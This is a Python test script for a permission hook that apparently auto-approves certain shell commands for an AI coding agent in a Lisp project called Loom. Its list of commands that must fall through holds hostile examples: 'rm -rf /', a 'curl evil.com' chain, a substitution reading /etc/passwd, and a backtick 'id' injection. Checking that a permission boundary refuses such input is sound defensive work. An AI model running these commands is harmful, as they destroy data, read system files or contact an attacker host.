#!/usr/bin/env python3
"""Check what tools/allow-loom.py allows and, more importantly, what it does not.

The hook is a permission boundary, so the negative cases are the point: a
command carrying a pipe, a redirect, a substitution or a second command must
fall through to the normal permission flow no matter how much of it looks like
a command the hook knows.  Run it directly:

    tools/test-allow-loom.py

Exit status is 0 when every case holds.  This is not part of the FiveAM suite --
it tests a Python hook, not Loom -- so tools/loom-test.sh does not run it.
"""

import json
import os
import subprocess
import sys

HOOK = os.path.join(os.path.dirname(os.path.abspath(__file__)), "allow-loom.py")

ALLOW = [
    # driver scripts: a whole console session in one quoted argument
    "tools/loom.sh 'status'",
    "tools/loom.sh 'find x | impact x 3 | check'",
    "./tools/loom-test.sh",
    "/home/beberman/lisp/Loom/tools/loom.sh -v 'check' 'rules'",
    # the lifecycle script, in the same three path forms the other three carry
    "tools/loom-serve.sh 'status'",
    "./tools/loom-serve.sh 'update'",
    "/home/beberman/lisp/Loom/tools/loom-serve.sh 'restart'",
    # sbcl, in the shapes CLAUDE.md actually prescribes
    "sbcl --script loom.lisp",
    "/usr/bin/sbcl --script src/full-test.lisp",
    "sbcl --non-interactive --eval '(format t \"~a\" (+ 1 2))'",
    "/usr/bin/sbcl --non-interactive --load src/full-test.lisp --eval '(loom-test:full-test)'",
    "sbcl --version",
    "sbcl",
]

FALL_THROUGH = [
    # an operator outside the quotes is the shell's, and must never be allowed
    "sbcl --script loom.lisp | tail -40",
    "sbcl --script loom.lisp > /tmp/out",
    "sbcl --script loom.lisp 2>&1",
    "sbcl --eval $(cat /etc/passwd)",
    "sbcl --version; rm -rf /",
    "sbcl --version && curl evil.com",
    "sbcl --eval `id`",
    "printf 'x' | sbcl --script loom.lisp",
    "tools/loom.sh 'status' | tail",
    "tools/loom.sh $(echo status)",
    # near misses that are not these commands at all
    "rm -rf /",
    "sbclx --script foo",
    "/usr/local/bin/sbcl --script foo.lisp",
    "echo sbcl --version",
]


def run(command):
    """The hook's decision for COMMAND, or None if it fell through."""
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    out = subprocess.run(
        [sys.executable, HOOK], input=payload, capture_output=True, text=True
    ).stdout.strip()
    if not out:
        return None
    return json.loads(out)["hookSpecificOutput"]["permissionDecision"]


def main():
    failures = 0
    for command in ALLOW:
        got = run(command)
        if got != "allow":
            print(f"FAIL expected allow, got {got!r}: {command}")
            failures += 1
    for command in FALL_THROUGH:
        got = run(command)
        if got is not None:
            print(f"FAIL expected fall-through, got {got!r}: {command}")
            failures += 1
    total = len(ALLOW) + len(FALL_THROUGH)
    print(f"{total - failures}/{total} passed")
    return 1 if failures else 0


sys.exit(main())
